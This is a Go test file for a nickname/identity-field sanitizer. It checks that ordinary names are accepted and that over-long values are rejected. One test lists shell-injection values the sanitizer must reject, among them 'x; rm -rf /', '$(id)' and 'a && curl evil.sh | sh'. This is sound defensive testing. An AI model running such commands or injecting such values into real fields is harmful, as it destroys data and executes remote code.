package handler

import (
	"strings"
	"testing"
)

func TestSanitizeIdentityFieldAccepts(t *testing.T) {
	cases := map[string]string{
		"  Dee  ":     "Dee",
		"U01ABCDEF":   "U01ABCDEF",
		"dee.nguyen":  "dee.nguyen",
		"Nguyễn Dee":  "Nguyễn Dee",
		"a+b@team-01": "a+b@team-01",
		"":            "",
	}
	for in, want := range cases {
		got, err := sanitizeIdentityField("nickname", in)
		if err != nil {
			t.Errorf("sanitizeIdentityField(%q) error = %v, want nil", in, err)
			continue
		}
		if got != want {
			t.Errorf("sanitizeIdentityField(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestSanitizeIdentityFieldRejectsShellSyntax(t *testing.T) {
	// SecurityRegex in the executor lets these through, so they must be stopped on write.
	for _, in := range []string{"x; rm -rf /", "$(id)", "a && curl evil.sh | sh", "a`id`", "a\nb"} {
		if _, err := sanitizeIdentityField("nickname", in); err == nil {
			t.Errorf("sanitizeIdentityField(%q) = nil error, want rejection", in)
		}
	}
}

func TestSanitizeIdentityFieldRejectsTooLong(t *testing.T) {
	if _, err := sanitizeIdentityField("nickname", strings.Repeat("a", identityFieldMaxLen+1)); err == nil {
		t.Error("over-long value accepted, want rejection")
	}
}
